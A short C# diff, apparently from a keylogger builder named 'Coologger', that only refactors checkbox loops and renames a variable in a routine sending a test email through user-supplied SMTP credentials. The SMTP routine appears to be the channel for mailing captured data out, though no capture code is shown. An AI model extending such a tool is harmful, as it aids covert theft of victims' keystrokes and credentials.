@@ -373,13 +373,13 @@ namespace Coologger
                                };
             if (CheckBox5.Checked)
             {
-                for (int i = 0; i < boxes.Length; i++)
-                    boxes[i].Checked = true;
+                foreach (CheckBox t in boxes)
+                    t.Checked = true;
             }
             else
             {
-                for (int i = 0; i < boxes.Length; i++)
-                    boxes[i].Checked = false;
+                foreach (CheckBox t in boxes)
+                    t.Checked = false;
             }
         }
 
@@ -387,12 +387,12 @@ namespace Coologger
         {
             try
             {
-                var Client = new SmtpClient(TextBox14.Text, 587);
+                var client = new SmtpClient(TextBox14.Text, 587);
                 var msg = new MailMessage();
 
 
-                Client.EnableSsl = true;
-                Client.Credentials =
+                client.EnableSsl = true;
+                client.Credentials =
                     new NetworkCredential(TextBox16.Text, TextBox15.Text);
 
                 msg.To.Add(new MailAddress(TextBox16.Text));
@@ -400,7 +400,7 @@ namespace Coologger
                 msg.Subject = "COOLogger";
                 msg.Body = "Problem? Not for you!";
 
-                Client.Send(msg);
+                client.Send(msg);
                 msg.Dispose();
                 MessageBox.Show("Success! Message Sent", "Success", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
             }
